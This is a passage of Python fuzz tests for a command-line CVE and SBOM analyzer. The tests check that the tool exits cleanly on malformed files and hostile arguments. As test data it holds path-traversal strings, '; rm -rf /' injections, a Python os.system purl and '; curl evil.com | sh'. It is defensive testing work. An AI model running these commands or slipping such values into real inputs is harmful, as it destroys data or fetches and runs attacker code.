    def _invoke(self, args: list[str]) -> int:
        result = self.runner.invoke(analyze, args, catch_exceptions=False)
        return result.exit_code

    def test_no_args(self):
        result = self.runner.invoke(analyze, [], catch_exceptions=False)
        assert result.exit_code != 0  # UsageError expected
        assert "Error" in result.output or result.exit_code == 2

    def test_cve_id_with_null_byte(self):
        result = self.runner.invoke(
            analyze, ["CVE-2024-1234\x00evil", "--no-llm", "--format", "json"],
            catch_exceptions=False,
        )
        # Exits non-zero or produces error — must not crash with traceback
        assert isinstance(result.exit_code, int)

    def test_cve_id_with_path_traversal(self):
        result = self.runner.invoke(
            analyze, ["../../../etc/passwd", "--no-llm", "--format", "json"],
            catch_exceptions=False,
        )
        assert isinstance(result.exit_code, int)

    def test_version_flag_with_injection(self):
        result = self.runner.invoke(
            analyze,
            ["CVE-2023-32681", "--version", "; rm -rf /", "--no-llm", "--format", "json"],
            catch_exceptions=False,
        )
        assert isinstance(result.exit_code, int)

    def test_package_flag_with_traversal(self):
        result = self.runner.invoke(
            analyze,
            ["CVE-2023-32681", "--package", "../../../etc/passwd", "--no-llm", "--format", "json"],
            catch_exceptions=False,
        )
        assert isinstance(result.exit_code, int)

    def test_format_flag_invalid(self):
        result = self.runner.invoke(
            analyze,
            ["CVE-2023-32681", "--format", "evil; rm -rf /", "--no-llm"],
            catch_exceptions=False,
        )
        assert result.exit_code == 2  # Click UsageError

    def test_both_cve_and_input(self, tmp_path: Path):
        """Providing both CVE_ID and --input is a UsageError."""
        f = tmp_path / "sbom.json"
        f.write_text("{}")
        result = self.runner.invoke(
            analyze,
            ["CVE-2023-32681", "--input", str(f), "--no-llm"],
            catch_exceptions=False,
        )
        assert result.exit_code != 0


# ── File input fuzz (--input with malformed files) ────────────────────────────


class TestFileInputFuzz:
    """--input must exit gracefully on malformed file content."""

    def setup_method(self):
        self.runner = CliRunner()

    def _run_with_file(self, content: str | bytes, suffix: str = ".json") -> int:
        with tempfile.NamedTemporaryFile(mode="wb", suffix=suffix, delete=False) as f:
            if isinstance(content, str):
                f.write(content.encode("utf-8", errors="replace"))
            else:
                f.write(content)
            fname = f.name
        try:
            result = self.runner.invoke(
                analyze,
                ["--input", fname, "--no-llm", "--format", "json"],
                catch_exceptions=False,
            )
            return result.exit_code
        finally:
            os.unlink(fname)

    def test_empty_file(self):
        """Empty file is invalid JSON — CLI exits 1 cleanly."""
        code = self._run_with_file("")
        assert code == 1  # graceful error, not traceback

    def test_malformed_json(self):
        """Malformed JSON — CLI exits 1 with error message, not crash."""
        code = self._run_with_file("{ this is not json }")
        assert code == 1

    def test_json_array_at_top_level(self):
        """JSON array (not dict) — treated as unrecognised format, exits 1."""
        code = self._run_with_file("[1, 2, 3]")
        assert code == 1

    def test_null_json(self):
        """JSON null — not a dict, CLI exits 1."""
        code = self._run_with_file("null")
        assert code == 1

    def test_json_boolean(self):
        """JSON true — not a dict, CLI exits 1."""
        code = self._run_with_file("true")
        assert code == 1

    def test_binary_file(self):
        """Binary file — UnicodeDecodeError caught, CLI exits 1."""
        code = self._run_with_file(b"\x80\x81\x82\x83\xff\xfe\xfd")
        assert code == 1

    def test_unicode_bom_json(self):
        """BOM-prefixed JSON — treated as invalid JSON, CLI exits 1."""
        content = "\ufeff" + json.dumps({"Results": []})
        code = self._run_with_file(content)
        assert code == 1

    def test_json_with_null_bytes(self):
        """Null bytes in JSON string values — stored as-is in scanner findings."""
        content = '{"Results": [{"Vulnerabilities": [{"VulnerabilityID": "CVE-2024-1234\x00"}]}]}'
        code = self._run_with_file(content)
        assert isinstance(code, int)  # behavior depends on JSON parser

    def test_deeply_nested_json(self):
        """100-level deep nesting must not overflow the stack."""
        obj: dict = {}
        current = obj
        for _ in range(100):
            current["a"] = {}
            current = current["a"]
        code = self._run_with_file(json.dumps(obj))
        assert isinstance(code, int)

    def test_huge_json_string_values(self):
        content = json.dumps({
            "Results": [
                {
                    "Vulnerabilities": [
                        {
                            "VulnerabilityID": "CVE-2024-1234",
                            "PkgName": "A" * 100_000,
                            "InstalledVersion": "B" * 100_000,
                        }
                    ]
                }
            ]
        })
        code = self._run_with_file(content)
        assert isinstance(code, int)

    def test_valid_cyclonedx_with_malicious_purl(self):
        sbom = {
            "bomFormat": "CycloneDX",
            "specVersion": "1.4",
            "components": [
                {"type": "library", "purl": "; rm -rf /"},
                {"type": "library", "purl": "../../../etc/passwd@1.0"},
                {"type": "library", "purl": "pkg:pypi/__import__('os').system('id')@1.0"},
            ],
        }
        code = self._run_with_file(json.dumps(sbom))
        assert isinstance(code, int)  # no CVEs found → clean exit

    def test_valid_spdx_with_malicious_externalref(self):
        sbom = {
            "spdxVersion": "SPDX-2.3",
            "packages": [
                {
                    "name": "evil",
                    "externalRefs": [
                        {
                            "referenceCategory": "PACKAGE-MANAGER",
                            "referenceType": "purl",
                            "referenceLocator": "file:///etc/passwd",
                        },
                        {
                            "referenceCategory": "PACKAGE-MANAGER",
                            "referenceType": "purl",
                            "referenceLocator": "; curl evil.com | sh",
                        },
                    ],
                }
            ],
        }
        code = self._run_with_file(json.dumps(sbom))
        assert isinstance(code, int)

    def test_input_path_traversal(self):
        """Passing a path-traversal string to --input → CLI exits 1 with error, no crash."""
        result = self.runner.invoke(
            analyze,
            ["--input", "../../../etc/passwd", "--no-llm"],
            catch_exceptions=False,
        )
        assert result.exit_code != 0  # error exit, not 0 and not an unhandled exception
